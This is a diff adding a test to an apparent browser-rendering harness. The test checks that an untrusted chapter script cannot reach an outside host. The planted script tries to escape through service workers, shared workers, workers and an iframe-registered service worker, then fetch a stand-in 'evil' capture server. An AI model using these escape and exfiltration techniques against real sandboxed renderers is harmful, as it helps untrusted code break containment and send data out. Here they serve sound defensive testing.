@@ -196,6 +196,48 @@ test('a chapter cannot navigate away, fetch out, or pop a window to an external 
   expect(hits).toEqual([]);
 }, T);
 
+test('a chapter cannot reach an external host through a service worker, a shared worker or a worker', async () => {
+  // Workers are separate targets: their requests never pass through render.mjs's page-level interception, and a
+  // worker script served from /v/ carries no CSP of its own. So each variant below re-runs this very chapter file
+  // as a worker, which then fetches the capture server. That includes registering a service worker from a
+  // same-origin iframe of a file served without any CSP (/src/lyrics.js), where the page's own worker-src can't
+  // reach. The busy-wait at the end holds the page for a moment so the workers get their chance before the render
+  // finishes and the browser closes.
+  const hits = [];
+  const capture = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch(req) { hits.push(req.url); return new Response('should never be reached'); } });
+  const evil = `http://127.0.0.1:${capture.port}`;
+  const data = tempDir(), db = openDb(join(data, 'user.db'));
+  db.createVersion({ id: 'worker-escapee' });
+  db.writeFiles('worker-escapee', [{ path: 'ch/c01.js', content: [
+    `if (typeof document === 'undefined') {`,
+    `  const kind = typeof ServiceWorkerGlobalScope !== 'undefined' ? 'service-worker' : typeof SharedWorkerGlobalScope !== 'undefined' ? 'shared-worker' : 'worker';`,
+    `  fetch(${JSON.stringify(evil)} + '/' + kind + location.search).catch(() => {});`,
+    `} else {`,
+    `  const src = document.currentScript.src;`,
+    `  navigator.serviceWorker.register(src + '?from=page').catch(() => {});`,
+    `  try { new SharedWorker(src + '?from=page'); } catch {}`,
+    `  try { new Worker(src + '?from=page'); } catch {}`,
+    `  const frame = document.createElement('iframe');`,
+    `  frame.src = '/src/lyrics.js';`,
+    `  frame.onload = () => { try { frame.contentWindow.navigator.serviceWorker.register(src + '?from=iframe').catch(() => {}); } catch {} };`,
+    `  document.body.append(frame);`,
+    `  for (const until = Date.now() + 1500; Date.now() < until;) {}`,
+    `}`,
+  ].join('\n') }], { source: 'manual' });
+  db.close();
+  const out = mkdtempSync(join(tmpdir(), 'sheet-'));
+  try {
+    const r = await spawn(['bun', 'render.mjs', '--v=worker-escapee', '--sheet=1', `--out=${join(out, 'sheet.jpg')}`], { env: isolatedEnv(data) });
+    expect(r.err).toBe('');
+    expect(r.code).toBe(0);
+    expect(statSync(join(out, 'sheet.jpg')).size).toBeGreaterThan(1000);
+    await Bun.sleep(1000);   // a request still in flight when the browser closed would land about now
+  } finally {
+    capture.stop(true);
+  }
+  expect(hits).toEqual([]);
+}, T);
+
 test('a data: URI image still renders under request interception', async () => {
   // Chrome reports a data: URI as a "request" to Fetch-domain interception (so it does reach the handler below),
   // but it never actually goes over the network — abort()/continue() has no effect on it either way, and it loads
